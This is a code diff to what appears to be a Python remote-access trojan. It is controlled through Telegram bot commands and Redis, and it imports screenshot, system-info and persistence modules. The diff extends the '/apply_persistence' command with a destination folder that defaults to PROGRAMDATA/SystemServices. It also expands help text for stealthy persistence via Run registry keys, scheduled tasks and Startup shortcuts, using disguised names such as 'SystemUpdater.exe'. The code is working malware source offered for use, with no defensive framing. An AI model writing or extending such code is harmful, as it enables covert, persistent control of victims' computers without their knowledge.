@@ -28,16 +28,14 @@ from libs.screenshot import screen_save
 from libs.system_info import get_systeminfo as systinfo
 import libs.persistence as persistence_lib
 
-#REDIS CONF
+
 REDIS_HOST = ""
 REDIS_PORT = 000 #PORT GOES HERE
 REDIS_PASS = ""
 
 #TELEGRAM CONF
-TELEGRAM_BOT_TOKEN = "" 
-NOTIFY_CHATID = "" 
-
-
+TELEGRAM_BOT_TOKEN = ""
+NOTIFY_CHATID = ""
 
 
 
@@ -1228,10 +1226,6 @@ PERSISTENCE_METHODS = {
 
 @command_handler("/list_persistence_methods")
 async def handle_list_persistence_methods(data, *args):
-    """
-    List all available persistence methods and their descriptions.
-    Usage: /list_persistence_methods
-    """
     try:
         methods_info = "\n".join([f"- {method}: {desc}" for method, desc in PERSISTENCE_METHODS.items()])
         response = f"Available Persistence Methods:\n\n{methods_info}"
@@ -1242,38 +1236,40 @@ async def handle_list_persistence_methods(data, *args):
 
 @command_handler("/apply_persistence")
 async def handle_apply_persistence(data, *args):
-    """
-    Apply a specific persistence method.
-    Usage: /apply_persistence <method> [stealth_name] [key_name]
-    """
     try:
         if len(args) < 1:
-            await send_message(NOTIFY_CHATID, "Usage: /apply_persistence <method> [stealth_name] [key_name]")
+            await send_message(NOTIFY_CHATID, "Usage: /apply_persistence <method> [stealth_name] [key_name] [destination_folder]")
             return
 
         # Extract arguments
         method = args[0]
         stealth_name = args[1] if len(args) > 1 else None
         key_name = args[2] if len(args) > 2 else None
+        destination_folder = args[3] if len(args) > 3 else None
 
         if method not in PERSISTENCE_METHODS:
             await send_message(NOTIFY_CHATID, f"Invalid method. Use /list_persistence_methods to see available methods.")
             return
 
-        # Apply the persistence method using the library
-        persistence_lib.apply_persistence(method=method, stealth_name=stealth_name, key_name=key_name)
+        # Default destination folder to PROGRAMDATA if not specified
+        destination_folder = destination_folder or os.path.join(os.getenv("PROGRAMDATA"), "SystemServices")
 
-        await send_message(NOTIFY_CHATID, f"Successfully applied persistence method: {method}")
+        # Apply the persistence method using the library
+        persistence_lib.apply_persistence(
+            method=method,
+            stealth_name=stealth_name,
+            key_name=key_name,
+            destination_folder=destination_folder
+        )
+
+        await send_message(NOTIFY_CHATID, f"Successfully applied persistence method: {method}\n"
+                                          f"Destination Folder: {destination_folder}")
     except Exception as e:
         await send_message(NOTIFY_CHATID, f"Error applying persistence: {e}")
 
 
 @command_handler("/persistence_help")
 async def handle_persistence_help(data, *args):
-    """
-    Provide help information about persistence methods.
-    Usage: /persistence_help <method>
-    """
     try:
         if len(args) < 1:
             await send_message(NOTIFY_CHATID, "Usage: /persistence_help <method>")
@@ -1284,14 +1280,14 @@ async def handle_persistence_help(data, *args):
             await send_message(NOTIFY_CHATID, f"Invalid method. Use /list_persistence_methods to see available methods.")
             return
 
-        # Provide detailed help for the selected method
         if method == "registry":
             details = (
                 "Registry Persistence:\n"
                 "- Creates a registry key under HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.\n"
                 "- Parameters:\n"
                 "  - stealth_name: Name for the executable (default: 'SystemUpdater.exe').\n"
-                "  - key_name: Name of the registry key (default: 'SystemTask')."
+                "  - key_name: Name of the registry key (default: 'SystemTask').\n"
+                "  - destination_folder: Folder to copy the executable (default: 'PROGRAMDATA/SystemServices')."
             )
         elif method == "task":
             details = (
@@ -1299,7 +1295,8 @@ async def handle_persistence_help(data, *args):
                 "- Creates a scheduled task to run the executable at user login.\n"
                 "- Parameters:\n"
                 "  - stealth_name: Name for the executable (default: 'SystemUpdater.exe').\n"
-                "  - key_name: Name of the scheduled task (default: 'SystemUpdateTask')."
+                "  - key_name: Name of the scheduled task (default: 'SystemUpdateTask').\n"
+                "  - destination_folder: Folder to copy the executable (default: 'PROGRAMDATA/SystemServices')."
             )
         elif method == "shortcut":
             details = (
@@ -1307,7 +1304,8 @@ async def handle_persistence_help(data, *args):
                 "- Places a shortcut in the user's Startup folder.\n"
                 "- Parameters:\n"
                 "  - stealth_name: Name for the executable (default: 'SystemUpdater.exe').\n"
-                "  - key_name: Name of the shortcut file (default: 'Updater.lnk')."
+                "  - key_name: Name of the shortcut file (default: 'Updater.lnk').\n"
+                "  - destination_folder: Folder to copy the executable (default: 'PROGRAMDATA/SystemServices')."
             )
         else:
             details = "No help available for this method."
@@ -1315,6 +1313,8 @@ async def handle_persistence_help(data, *args):
         await send_message(NOTIFY_CHATID, details)
     except Exception as e:
         await send_message(NOTIFY_CHATID, f"Error providing persistence help: {e}")
+
+
 
 @command_handler("/status")
 async def handle_status(data, *args):
